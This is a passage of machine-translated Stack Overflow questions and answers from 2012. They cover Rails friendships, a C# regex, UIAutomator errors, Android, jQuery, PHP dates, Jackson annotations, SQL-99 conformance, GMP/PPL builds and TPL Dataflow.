  validates_format_of :username, :with => /^[-\w\._@]+$/i, :allow_blank => true, :message => "should only contain letters, numbers, or .-_@"
  validates_format_of :email, :with => /^[-a-z0-9_+\.]+\@([-a-z0-9]+\.)+[a-z0-9]{2,4}$/i
  validates_presence_of :password, :on => :create
  validates_confirmation_of :password
  validates_length_of :password, :minimum => 4, :allow_blank => true

  has_many :flits, :dependent => :destroy

  has_many :friendships
  has_many :friends, :through => :friendships

  def self.add_friend(friend)
    friendship = friendships.build(:friend_id => friend.id)
      if !friendship.save
        logger.debug "User '#{friend.email}' already exists in the user's friendship list."
      end
  end

  # login can be either username or email address
  def self.authenticate(login, pass)
    user = find_by_username(login) || find_by_email(login)
    return user if user && user.password_hash == user.encrypt_password(pass)
  end

  def encrypt_password(pass)
    BCrypt::Engine.hash_secret(pass, password_salt)
  end

  private

  def prepare_password
    unless password.blank?
      self.password_salt = BCrypt::Engine.generate_salt
      self.password_hash = encrypt_password(password)
    end
  end
end 
```

**友谊.rb**

```
class Friendship < ActiveRecord::Base
  attr_accessible :friend_id, :user_id

  belongs_to :user
  belongs_to :friend, :class_name => 'User'
  validates_uniqueness_of :friend_id, :scope => :user_id
  validates_presence_of :user_id, :friend_id
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:47:49.817

您应该将此方法定义为类方法而不是实例方法：

```
 def self.add_friend(friend)
    friendship = friendships.build(:friend_id => friend.id)
      if !friendship.save
        logger.debug "User '#{friend.email}' already exists in the user's friendship list."
      end
  end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:49:30.900

我认为你想要做的是调用`add_friend`实例*，* `user`而不是*类* `User`：

```
3.times do
  user.add_friend(User.all[rand(User.count)])
end 
```

此外，您的`add_friend`方法应该是实例方法，而不是类方法，因此您不需要`self`：

```
def add_friend(friend)
  friendship = friendships.build(:friend_id => friend.id)
    if !friendship.save
      logger.debug "User '#{friend.email}' already exists in the user's friendship list."
    end
end 
```

# c# - 正则表达式替换字符串的开头和结尾

> ID：13599153
> 
> 赞同：2
> 
> 时间：2012-11-28T06:32:37.930
> 
> 标签：c#, .net, regex

考虑以下输入：BEGINsomeotherstuffEND

我正在尝试编写一个正则表达式来替换 BEGIN 和 END，但前提是它们**都**存在。

我做到了：

```
(^BEGIN|END$) 
```

然后使用以下 c# 代码执行我的字符串替换：

```
private const string Pattern = "(^guid'|'$)";
private static readonly Regex myRegex = new Regex(Pattern, RegexOptions.Compiled | RegexOptions.CultureInvariant | RegexOptions.ExplicitCapture | RegexOptions.Singleline | RegexOptions.IgnoreCase);
var newValue = myRegex.Replace(input, string.empty); 
```

但不幸的是，这与其中任何一个都匹配——不仅当它们都存在时。

我也试过：

```
^BEGIN.+END$ 
```

但这会捕获整个字符串，因此将替换整个字符串。

就我的正则表达式知识而言，这差不多。

帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T06:37:04.917

我不认为你真的需要一个正则表达式。试试类似的东西：

```
if (str.StartsWith("BEGIN") && str.EndsWith("END"))
    str = "myreplaceBegin" + str.Substring(5, str.Length - 8) + "myreplaceEnd"; 
```

从您的代码中，您似乎只想*删除*开头和结尾部分（而不是用任何东西替换它们），所以您可以这样做：

```
if (str.StartsWith("BEGIN") && str.EndsWith("END"))
    str = str.Substring(5, str.Length - 8); 
```

*当然，请务必将索引替换为您要删除的实际长度。*

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-28T06:38:19.043

如何使用这个：

```
^BEGIN(.*)END$ 
```

然后用中间的部分替换整个字符串：

```
var match = myRegex.Match(input);
var newValue = match.Success ? match.Groups(1).Value : input; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T06:36:54.203

您不能将正则表达式用作解析引擎。但是，您可以将其颠倒过来并说您想要介于两者之间的内容：

```
begin(.*)end 
```

然后，只需抓住第 1 组中的内容

# android - 当我运行我的 android UIAutomator 代码时，它显示错误

> ID：13599157
> 
> 赞同：13
> 
> 时间：2012-11-28T06:32:59.807
> 
> 标签：android, ui-automation, android-testing

当我运行我的 android UIAutomator 代码时，它显示以下错误。

> INSTRUMENTATION_RESULT：shortMsg=java.lang.RuntimeException
> INSTRUMENTATION_RESULT：longMsg=com.android.ui.testing
> INSTRUMENTATION_CODE：0

我刚刚运行了 developer.android.com 中给出的示例代码
如何解决这个错误？

日志附在下面：

```
01-05 01:07:53.559: D/AndroidRuntime(5712): >>>>>> AndroidRuntime START com.android.internal.os.RuntimeInit <<<<<<
01-05 01:07:53.559: D/AndroidRuntime(5712): CheckJNI is ON
01-05 01:07:53.559: E/AndroidRuntime(5712): cannot open customer xml file
01-05 01:07:53.559: E/AndroidRuntime(5712): /system/csc/customer.xml can't open file
01-05 01:07:53.564: D/AndroidRuntime(5712): readGMSProperty: start
01-05 01:07:53.564: D/AndroidRuntime(5712): readGMSProperty: already setted!!
01-05 01:07:53.564: D/AndroidRuntime(5712): readGMSProperty: end
01-05 01:07:53.589: D/dalvikvm(5712): Trying to load lib libjavacore.so 0x0
01-05 01:07:53.599: D/dalvikvm(5712): Added shared lib libjavacore.so 0x0
01-05 01:07:53.609: D/dalvikvm(5712): Trying to load lib libnativehelper.so 0x0
01-05 01:07:53.609: D/dalvikvm(5712): Added shared lib libnativehelper.so 0x0
01-05 01:07:53.664: I/dalvikvm(5712): Zip is good, but no classes.dex inside, and no valid .odex file in the same directory
01-05 01:07:53.874: D/dalvikvm(5712): Note: class Landroid/app/ActivityManagerNative; has 152 unimplemented (abstract) methods
01-05 01:07:53.924: D/AndroidRuntime(5712): Calling main entry com.android.commands.uiautomator.Launcher
01-05 01:07:53.934: D/AndroidRuntime(5712): Shutting down VM
01-05 01:07:53.934: W/dalvikvm(5712): threadid=1: thread exiting with uncaught exception (group=0x40ffa2a0)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712): uncaught exception
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712): java.lang.RuntimeException: com.uia.example.my.LaunchSettings
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.uiautomator.testrunner.UiAutomatorTestRunner.start(UiAutomatorTestRunner.java:95)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.uiautomator.testrunner.UiAutomatorTestRunner.run(UiAutomatorTestRunner.java:82)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.commands.uiautomator.RunTestCommand.run(RunTestCommand.java:76)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.commands.uiautomator.Launcher.main(Launcher.java:83)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:237)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at dalvik.system.NativeStart.main(Native Method)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712): Caused by: java.lang.ClassNotFoundException: com.uia.example.my.LaunchSettings
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:61)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at java.lang.ClassLoader.loadClass(ClassLoader.java:501)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at java.lang.ClassLoader.loadClass(ClassLoader.java:461)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.uiautomator.testrunner.TestCaseCollector.addTestClass(TestCaseCollector.java:83)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.uiautomator.testrunner.TestCaseCollector.addTestClass(TestCaseCollector.java:71)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.uiautomator.testrunner.TestCaseCollector.addTestClasses(TestCaseCollector.java:52)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  at com.android.uiautomator.testrunner.UiAutomatorTestRunner.start(UiAutomatorTestRunner.java:92)
01-05 01:07:53.939: E/UiAutomatorTestRunner(5712):  ... 6 more
01-05 01:07:53.944: I/AndroidRuntime(5712): VM exiting with result code -1. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T17:21:29.363

**如果在运行 uiautomator 测试时遇到 ClassNotFindException ：**

我们中的一些人收到此错误是因为他们的 ROM 将文件夹 /data/dalvik-cache 置于只读模式。使用 Cyanogen 的 S3 发生在我身上。

在这种情况下，输入 bash ：

```
adb shell 
su
chmod 777 /data/dalvik-cache
exit 
```

重新运行您的测试，这应该可以工作。由于 dalvik-cache 对应用程序已锁定，因此 uiautomator 无法要求 dalvik 解压缩测试的 jar，并且 dalvik 不会找到它的类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T23:20:44.243

查看是否删除 @UiThreadTest 注释或删除 runOnUiThread() 调用或重构您的测试工作。但是没有 logcat，很难理解它的来源。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-08T15:14:15.670

有同样的问题。我见过的大多数演示都表明将 jar 安装到 /data/local/tmp/。我看到其他人表示尝试将其安装到您的 SD 卡 (/storage/sdcard0)。这样做之后，它起作用了。似乎是读取权限的问题。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-10T10:50:53.503

我通过使用“ant build”来创建我的 jar 解决了这个错误。如果你在 eclipse 中使用 export 创建一个 jar 文件，生成的类文件中可能有一些错误，因此上述类未找到错误。

# macos - 中间状态期间的 NSProgressIndicator 动画

> ID：13599159
> 
> 赞同：1
> 
> 时间：2012-11-28T06:33:07.500
> 
> 标签：macos, cocoa, animation, nsprogressindicator

我正在显示一个进度条来显示上传数据的进度。当我完成上传过程时，我有一些最终步骤，此时我计划将进度条的状态更改为中间状态（就像 mac 安装程序在安装过程的最后一刻显示的那样）。所以我所做的是，我将状态更改为中间状态。现在进度条显示有倾斜的蓝色条纹。但它不是动画。此时如何激活动画？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T06:39:23.587

`[NSProgressIndicatorInstance startAnimation:self]`将（重新）启动动画并`[NSProgressIndicatorInstance stopAnimation:self]`再次停止。

# android - 如何在 Android 上将图像复制到剪贴板管理器，例如？

> ID：13599162
> 
> 赞同：5
> 
> 时间：2012-11-28T06:33:20.993
> 
> 标签：android, image, copy-paste, clipboardmanager

我想将存储在资源文件夹中的图像复制到剪贴板管理器，以便稍后粘贴到另一个应用程序上，例如邮件、whatapp 或聊天。我有研究人员的几个链接，有些人提到这可以通过将 uri 制作到文件中来完成。

这是我得到的最好的，有人可以指出一个可行的例子。

```
File imageFile = new File("file:///android_asset/coco_001.png");
ContentValues values = new ContentValues(2);

values.put(MediaStore.Images.Media.MIME_TYPE, "image/png");
values.put(MediaStore.Images.Media.DATA, imageFile.getAbsolutePath());
ContentResolver theContent = getContentResolver();
Uri  imageUri = theContent.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);  
ClipData theClip = ClipData.newUri(getContentResolver(),"Image", imageUri); 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-28T07:37:04.353

尝试在代码末尾添加这两行代码。

```
android.content.ClipboardManager clipboard = (android.content.ClipboardManager)getSystemService(Context.CLIPBOARD_SERVICE);             
clipboard.setPrimaryClip(theClip); 
```

# android - 使用 RECEIVERS 更改日期后，我在模拟器中一无所获

> ID：13599164
> 
> 赞同：0
> 
> 时间：2012-11-28T06:33:27.113
> 
> 标签：android, android-emulator

我有这个 .xml 文件....来展示我的整个代码

```
<receiver android:name=".broad_2">
    <intent-filter>
        <action android:name="android.intent.action.DATE_CHANGED"></action>
    </intent-filter>
</receiver>

<activity
    android:name=".the_rock_iss"
    android:label="time_change_hua" >
    <intent-filter>
        <action android:name="android.intent.action.HO_HO_HO" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity> 
```

& 我用这个接收器发现我的日期被改变了，在设备中

```
public void onReceive(Context context, Intent intent) 
{
    if(intent.getAction().equals(Intent.ACTION_DATE_CHANGED))
    {
        Intent i = new Intent();
        i.setClassName("com.example.time_change_ho_tho_activity_start_ho", "com.example.time_change_ho_tho_activity_start_ho.the_rock_iss");
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);       

    }
} 
```

＆从这个接收器，我想**打开我的活动**。这是....更改日期后不显示在模拟器中！

```
public void onCreate ( Bundle bun )
{
    super.onCreate(bun);
    setContentView(R.layout.activity_main);
} 
```

& 为此，我有这个 .xml 文件，用于展示用户界面。

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true"
        android:text="@string/hello_world"
        tools:context=".MainActivity" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:42:17.407

我认为您一无所获，因为您只会在日期更改的确切时刻激发您的意图。根据我从您的问题中了解到的情况，您正在设置模拟器，然后以不同的日期重新运行它。我想如果你把它放在你的手机上过夜，你`onRecieve()`就会被触发。

# javascript - 如何提取列表的第一个元素并用它来替换jquery中的列表？

> ID：13599168
> 
> 赞同：0
> 
> 时间：2012-11-28T06:33:41.760
> 
> 标签：javascript, jquery, html

原始的 HTML 代码是这样的：

```
<div>
<ul class="alt">
   <li> <a class="button1"> Button1 </a></li>
   <li> <a class="button2"> Button2 </a></li>
</ul>
</div> 
```

然后我想把它改成这样：

```
<div>
  <a class="button1"> Button1 </a>
</div> 
```

有谁知道如何在 jquery 中实现这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T06:35:24.337

`.first()`您可以通过或获得拳头元素`:first Selector`

```
$('div').html($('div li:first').html()) 
```

或尝试

```
$("div").html($('li').first().html()); 
```

[**提琴手**](http://jsfiddle.net/ZhpWp/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T06:35:06.660

你可以这样做。

**[现场演示](http://jsfiddle.net/JudBH/3/)**

```
$('.alt').closest('div').html($('.alt li:first').html()); 
```

`Its better to assign some id to div you are intending to make it unique`, 以便您所做的更改仅限于此 div。

**HTML**

```
<div id="div1">
<ul class="alt">
   <li> <a class="button1"> Button1 </a></li>
   <li> <a class="button2"> Button2 </a></li>
</ul>
</div> 
```

**Javascript**

```
$('#div1').html($('#div1 li:first').html()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:39:18.380

或这个 ：）

```
$('.alt').replaceWith( $('.alt>li:eq(0)').contents() ); 
```

或者只是为了好玩：

```
$('.alt>li:eq(0)').unwrap().siblings().remove().end().contents().unwrap(); 
```

# datetime - 月份转换为单词

> ID：13599171
> 
> 赞同：1
> 
> 时间：2012-11-28T06:33:54.470
> 
> 标签：datetime, php

我将日期存储在数组中，用于项目的完成状态，如下所示

前两个字母是月份，其他四个字母是年份

052012(mmyyy)

```
$arrDates = array('052012', '042013', '082013', '122013', '022014'); 
```

我想要这个数组转换为如下的措辞

```
$arrDates = array('Completed', 'Next Six Months', 'Next Year', 'Next Year', 'After 2 Years'); 
```

我使用了如下的 for 循环来检查是否已完成，如下所示

```
for($i=0;$i<count($arrDates);$i++)
{
  if((date('m') > substr($arrDates[$i], 0,2)) && (date('y') == substr($arrDates[$i], 2,6)))           
  $strStatus = ' Completed';
} 
```

我搞砸了寻找明年和其他两个。

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:52:08.657

我认为您可以使用`DateTime`and`dateInterval`为此：

```
$currentDate = DateTime::createFromFormat('mY',$arrDates[0]);
$interval = $currentDate->diff(new DateTime('now'),true);
if($interval->invert){
   echo 'Completed';
else if($interval->y >= 2 ){
   echo 'After 2 Years';
}
else if($interval->y == 1){
   echo 'Next Year';
}
else if($interval->m > 6){
   echo 'what you want here';
}
else {
   echo 'Next six months';
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T22:46:57.097

我认为 artragis 的回答是正确的（为此 +1），但整个事情应该封装在一个函数中以供重用。

```
/**
 * @param string $expectedDate
 * @return string Text summary of time to completion
 */
function completionTimeInWords($expectedDate)
{
    $now = new DateTime();
    $date = new DateTime();
    $date->setTimestamp(strtotime('+1 year'));
    $oneYear = $date->diff($now)->days;
    $sixMonths = round($oneYear/2);
    $date->setTimestamp(strtotime('+2 years'));
    $twoYears = $date->diff($now)->days;

    $date = DateTime::createFromFormat('mY', $expectedDate);
    $interval = $now->diff($date);
    $completed = (bool)$interval->invert;
    $days = $interval->days;
    if($completed){
        return 'Completed';
    } elseif($days <= $sixMonths){
        return 'Next Six Months';
    } elseif($days > $sixMonths && $days <= $oneYear){
        return 'Within a year';
    } elseif($days > $oneYear && $days <= $twoYears){
        return 'Next Year';
    } elseif($days > $twoYears){
        return 'After Two Years';
    }
} 
```

我使用以下代码对此进行了测试：-

```
$date = new DateTime();
$date->setTimestamp(strtotime('two weeks ago'));
$arrDates[] = $date->format('mY');
$date->setTimestamp(strtotime('+ 5 months 27 days'));
$arrDates[] = $date->format('mY');
$date->setTimestamp(strtotime('+ 6 months 4 days'));
$arrDates[] = $date->format('mY');
$date->setTimestamp(strtotime('+ 12 months 4 days'));
$arrDates[] = $date->format('mY');
$date->setTimestamp(strtotime('+ 24 months 4 days'));
$arrDates[] = $date->format('mY');
foreach($arrDates as $date){
    var_dump(completionTimeInWords($date));
} 
```

并得到以下输出：-

```
string(9) "Completed"
string(15) "Next Six Months"
string(13) "Within a year"
string(9) "Next Year"
string(15) "After Two Years" 
```

您可能需要对边缘情况进行更多测试，因为这些可能会出现问题。例如，我们大多数人会同意 6 个月是 183 天，但 PHP 有时可能会不同意，这取决于从现在到 6 个月之间每个月有多少天（如果这有意义的话）。这就是为什么我将一年除以 2 得到 6 个月，而不是使用`strtotime()`.

# java - 让 JsonIgnore 或 JsonIgnoreProperties 在 servlet 过滤器上工作

> ID：13599172
> 
> 赞同：0
> 
> 时间：2012-11-28T06:33:54.510
> 
> 标签：java, json, jersey, jackson

Java 对象必须在球衣应用程序的 servlet 过滤器中序列化为 json 字符串。

有以下对象，

```
 @XmlRootElement
 @JsonIgnoreProperties({"bar"})
 public class Foo{
    String a="1";

    String b="2";

    @JsonIgnore
    String bar="3";

    };

      ObjectMapper om = new ObjectMapper();
      om.writeValueAsString(fooObject); 
```

返回，

```
 {
          a:"1",
          b:"2",
          bar:"3" // Inspite of Jsonignore and jsonignoreproperties bar is returned
          } 
```

我该如何克服呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:48:08.580

修复从 codehaus 到 fastxml 的导入并将以下功能添加到映射器修复了该问题。

```
 mapper.configure(MapperFeature.USE_ANNOTATIONS, true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T08:23:37.423

使用@XmlTransient：

```
@XmlTransient
String bar="3"; 
```

# iphone - iOS - UIActivityIndi cator 导致“停止时隐藏但既不隐藏也不动画”警告

> ID：13599174
> 
> 赞同：13
> 
> 时间：2012-11-28T06:34:05.847
> 
> 标签：iphone, ios, xcode, nib, uiactivityindicatorview

对于每个包含`UIActivityIndicator`.
警告指出：
`Unsupported Configuration: Hides when stopped but is neither hidden or animating`

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-28T08:11:04.620

这意味着，您已设置`Hides when stopped`.

所以必须只有两种状态，

1.  隐
2.  动画

但是您既没有设置隐藏也没有设置动画。

看图片：

![在此处输入图像描述](../Images/bcb1022ebc1254fd4210b1ddb6342e12.png)

它必须是`Hidden`或`Animating`，如果您已选中`Hides when stopped`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T08:43:31.357

您选择了停止时隐藏选项，但您从未隐藏活动指示器。设置你的设置，如附图所示

![在此处输入图像描述](../Images/41b484c1d4a143ba880d12f29c91ea50.png)

# sql - 将 T-SQL 查询转换为 ANSI SQL-99 标准

> ID：13599182
> 
> 赞同：2
> 
> 时间：2012-11-28T06:34:56.367
> 
> 标签：sql, sql-server, tsql

我正在为 SQL Server 查询考试而学习，并且我从网站上获得了一些练习题的演示。其中一个问题要求从两个表 (`Customers`和`Orders`) 中提取，使用第一个首字母作为别名，找到每个客户的最新订单，并首先使用最新订单对其进行排序。`Adventureworks`有这样的表（`Sales.SalesOrderHeader`和`Sales.Customer`），所以我创建了这个查询并认为我已经解决了。

```
SELECT 
    c.CustomerID, 
    MAX(o.OrderDate) OVER (PARTITION BY c.customerid) AS MostRecentOrderDate
FROM 
    Sales.SalesOrderHeader o 
INNER JOIN 
    Sales.Customer c ON o.CustomerID = c.CustomerID
ORDER BY 
    OrderDate DESC 
```

但是......在问题的最后，它说要确保它符合 ANSI SQL-99 标准。

所以我检查了这段代码

[http://developer.mimer.com/validator/parser99/index.tml#parser](http://developer.mimer.com/validator/parser99/index.tml#parser)

它告诉我

> *使用了核心 SQL-99 之外的以下功能：
> T611，基本 OLAP 操作
> F391，长标识符*

以下是 T611 Elementary OLAP 操作中包含的事物的定义：

*   窗口函数（ROW_NUMBER、RANK 和 DENSE_RANK）
*   未命名的窗口规格：
    *   窗口分区（PARTITION BY）
    *   窗口排序（ORDER BY）
    *   窗框（ROWS/RANGE PRECEDING/FOLLOWING）
*   空序

我不确定我收到“长标识符”错误的确切原因，但这里有一个来自 Microsoft 的链接，上面有一些东西。

[http://msdn.microsoft.com/en-us/library/hh544365(v=sql.105).aspx](http://msdn.microsoft.com/en-us/library/hh544365(v=sql.105).aspx)

不知道这是否真的有助于考试，但我对答案很感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T06:42:19.527

长标识符错误是由于标识符长度超过 30 个字符。试试这个查询它的工作原理::

```
SELECT 
    c.CustomerID, 
    MAX(o.OrderDate) AS mrod
FROM 
    SalesOrderHeader o 
INNER JOIN 
    Customer c ON o.CustomerID = c.CustomerID
group by c.customerID
ORDER BY 
    o.OrderDate DESC 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-12-20T09:59:11.767

在 Adventureworks 示例数据库上测试时，此问题的先前接受的答案会产生错误

> 列“SalesLT.SalesOrderHeader.OrderDate”在 ORDER BY 子句中无效，因为它既不包含在聚合函数也不包含在 GROUP BY 子句中。

条款有问题`order by`。您可以通过使用修复它

```
select C.LastName, max(O.OrderDate) as MROD
from SalesLT.Customer C inner join SalesLT.SalesOrderHeader O
on C.CustomerID = O.CustomerID
group by C.LastName
order by max(O.OrderDate) Desc 
```

或者

```
select C.LastName, max(O.OrderDate) as MROD
from SalesLT.Customer C inner join SalesLT.SalesOrderHeader O
on C.CustomerID = O.CustomerID
group by C.LastName
order by MROD Desc 
```

这两个示例都通过了 sql-99 验证器测试，但仅当我使用短名称时，例如 MROD 作为 max(O.OrderDate) 别名，而不是 MostRecentOrderDate。

而且，我刚刚通过了有问题的考试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:49:53.750

试试这个查询：

```
select c.CustomerID, 
       MAX(o.OrderDate), 
from  SalesOrderHeader o
INNER JOIN Customer c ON o.CustomerID = c.CustomerID
group by o.CustomerID 
ORDER BY 2 DESC 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T06:51:30.517

你`ORDER BY`是一个基本的 OLAP 操作。您可以安全地删除它，您的数据可能不会以您想要的方式显示。

长标识符错误是因为您正在引用`INFORMATION_SCHEMA.INFORMATION_SCHEMA_CATALOG_NAME`. 换句话说，你的`Sales.SalesOrderHeader`位。在您的情况下，您应该能够只引用信息模式目录名称，`SalesOrderHeader`而`Customer`无需指定`Sales.`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T10:52:06.050

通过 SQL-99，它们*可能*只是意味着用户 INNER JOIN 和 ON，而不是加入 WHERE 子句。

# linux - gcc-4.7.2 的先决条件：ppl-0.11 找不到 gmp-4.3.2

> ID：13599186
> 
> 赞同：0
> 
> 时间：2012-11-28T06:35:14.783
> 
> 标签：linux, gcc

我正在尝试为`gcc-4.7.2`.

`ppl-0.11`和都是`gmp-4.3.2`推荐的版本`<gcc_src>/gcc-4.7.2/gcc/doc/HTML/prerequisites.html`

我已经构建并安装`gmp-4.3.2`（带有`--enable-cxx`设置）

尝试配置`ppl-0.11`失败。

```
configure: error: Cannot find GMP version 4.1.3 or higher.
GMP is the GNU Multi-Precision library:
see http://www.swox.com/gmp/ for more information.
When compiling the GMP library, do not forget to enable the C++ interface:
add --enable-cxx to the configuration options. 
```

这是我的配置行：

```
./configure \
    --prefix=$PREFIX \
    --with-gmp=$PREFIX \
    --with-gmp-prefix=$PREFIX \ 
```

如果我查看我指定的目录`with-gmp`，这里是安装的 gmp：

```
$ grep MP_VERSION $PREFIX/include/gmp*

    $PREFIX/include/gmp.h:#define __GNU_MP_VERSION 4
    $PREFIX/include/gmp.h:#define __GNU_MP_VERSION_MINOR 3
    $PREFIX/include/gmp.h:#define __GNU_MP_VERSION_PATCHLEVEL 2 
```

.

```
$ l $PREFIX/include/gmp*

    $PREFIX/include/gmp.h
    $PREFIX/include/gmpxx.h 
```

.

```
$ l /$PREFIX/lib/libgmp*

    $PREFIX/lib/libgmp.a
    $PREFIX/lib/libgmp.la
    $PREFIX/lib/libgmp.so -> libgmp.so.3.5.2
    $PREFIX/lib/libgmp.so.3 -> libgmp.so.3.5.2
    $PREFIX/lib/libgmp.so.3.5.2
    $PREFIX/lib/libgmpxx.a
    $PREFIX/lib/libgmpxx.la
    $PREFIX/lib/libgmpxx.so -> libgmpxx.so.4.1.2
    $PREFIX/lib/libgmpxx.so.4 -> libgmpxx.so.4.1.2
    $PREFIX/lib/libgmpxx.so.4.1.2 
```

我错过了什么吗？

据我所知，GMP 是可用的并且是必需的版本

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-29T14:44:56.447

所以我也面临同样的问题，我所做的是：

1) 进入 gmp-4.3.2 文件夹
2) make distclean
3) ./configure --prefix=/home/sen/Documents/mingw/downloads/gmp_build --enable-cxx
4) make && make install
5) 进入ppl-0.11 文件夹
6) ./configure --prefix=/home/sen/Documents/mingw/downloads/ppl_build --with-gmp-prefix=/home/sen/Documents/mingw/downloads/gmp_build --enable-cxx
7）制作和制作安装

花了大约 10-20 分钟来编译，一切都很好。

谢谢，
森

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-09T15:44:32.480

*默认情况下， PPL将尝试使用**GMP*的默认位置。如果您使用*crosstool-ng*，则必须进行*跨本地*或*加拿大跨*构建。如果您手动执行此操作，`CXXFLAGS`请使用 a和 a指定*PPL 的* 。这允许*PPL*找到正确的*GMP*版本。`./configure``-I<path-to-gmp-header>``-Wl,-L<path-to-gmp-libs>` *`./configure`*

 **显然是一个*PPL*配置，

```
--prefix=$PREFIX \
--with-gmp=$PREFIX \
--with-gmp-prefix=$PREFIX \ 
```

是不足够的。在我意识到我不再构建*交叉编译器*，而是在我**不**使用我的*发行版时构建了一个**加拿大交叉*，而是另一个具有较低*glibc*共享库的*主机编译器*之前，我仔细研究了`./configure`脚本并破解了*crosstool-ng* . 如果您希望编译器在更大类的机器上运行，这很有用。构建编译器的*glibc*版本不太可能产生太大影响。 *****`gcc`*****

 *****我仍然需要修补*crosstool-* ng `120-ppl.sh`，

 *```
do_ppl_for_build() {
...    
    ppl_cxxflags="${CT_CFLAGS_FOR_BUILD}"
+   ppl_cxxflags+=" -I${CT_BUILDTOOLS_PREFIX_DIR}/include "
+   ppl_cxxflags+=" -Wl,-L${CT_BUILDTOOLS_PREFIX_DIR}/lib "
    if [ "${CT_PPL_NEEDS_FPERMISSIVE}" = "y" ]; then
        ppl_cxxflags+=" -fpermissive"
    fi 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T06:38:19.547

根据您正在运行的发行版，您是否尝试过安装 gmp-devel 软件包（即 yum install gmp-devel 在 Fedora/RedHat 等上）？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-10-29T12:22:57.753

多年后，这个问题已经解决了。解决方法是首先下载最新版本的gmp。然后，像图片一样复制路径。不要忘记`./configure`with `--enable-cxx`，这是非常重要的一点。`./configure --enable-cxx`. 现在是时候进行 ppl 安装了，`./configure -help`表明`--with-gmp=DIR search for libgmp/libgmpxx in DIR/include and DIR/lib`. 所以写`./configure --with-gmp=<<dir of gmp as shown in first picture, you may have a different path>>`

[![在此处输入图像描述](../Images/52beae91ac74aee6f41845559b9d269c.png)](https://i.stack.imgur.com/1MmRu.png)

我分别写了 , `./configure --with-gmp=/usr/local/include`，`make`然后`sudo make install` 它就像一个魅力！

[![在此处输入图像描述](../Images/d6e73ef40daced59fa702403e73b12a2.png)](https://i.stack.imgur.com/YZFYD.jpg)********

# c# - TPL Dataflow，如何将项目转发到多个链接目标块中的一个特定目标块？

> ID：13599190
> 
> 赞同：22
> 
> 时间：2012-11-28T06:35:30.107
> 
> 标签：c#, task-parallel-library, actor, message-passing, tpl-dataflow

我正在寻找一种 TPL 数据流块解决方案，它可以容纳多个项目，它可以链接到多个目标块，但它能够将项目仅转发到通过过滤器/谓词的特定目标块。任何时候都不应将一个项目同时交付给多个目标块，始终只交付给与过滤器匹配的那个，否则该项目可以被丢弃。我不喜欢 BroadCastBlock，因为如果我理解正确，它不能保证交付（或者是吗？）并且过滤是在目标块端完成的，这意味着 BroadCastBlock 基本上将每个项目的副本发送到所有链接到目标块。如果我理解正确的话，它在任何时候都不会超过一件。我不想使用 Post/Async 但维护一个 LinkTo 链。

